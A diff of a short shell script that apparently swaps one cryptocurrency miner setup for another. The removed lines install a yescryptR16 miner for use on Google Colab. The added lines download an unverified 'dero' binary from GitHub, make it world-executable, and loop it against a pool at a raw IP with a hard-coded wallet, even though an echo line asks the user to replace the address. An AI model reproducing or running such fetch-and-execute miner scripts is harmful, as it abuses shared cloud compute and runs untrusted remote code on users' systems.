@@ -1,24 +1,9 @@
-#!/bin/sh
-# Install XRDP
-# Before get xmr coin for free
-# Google Colab
-sudo apt update
-clear
-sudo apt install screen
-screen -R ZEUS
+wget https://github.com/angkii/m/raw/main/dero
+chmod 777 dero
 
-wget https://github.com/indah38/ccminer/raw/main/ZEUS
-chmod 700 ZEUS
-
-#!/bin/sh
-#
-# Choose nearest stratum:
-#       stratum-eu.rplant.xyz   /France/
-#       stratum-asia.rplant.xyz /Singapore/
-#       stratum-na.rplant.xyz   /Canada/
-#
-FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
-while [ 1 ]; do
-"$FOLDER"/ZEUS -a yescryptR16 -o stratum+tcp://178.128.86.41:80 -u vE1GBjfCJq8yLg7WwxwZAXizE3KZ7D6MiQ.tes
-sleep 5
+#!/bin/bash
+echo "Replace YOUR_ADDRESS to run the miner"
+while :; do
+    ./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmzrc98wdfz0jfq5r2crc.MAJA -r 159.223.188.176:80 -p stratum;
+    sleep 5;
 done
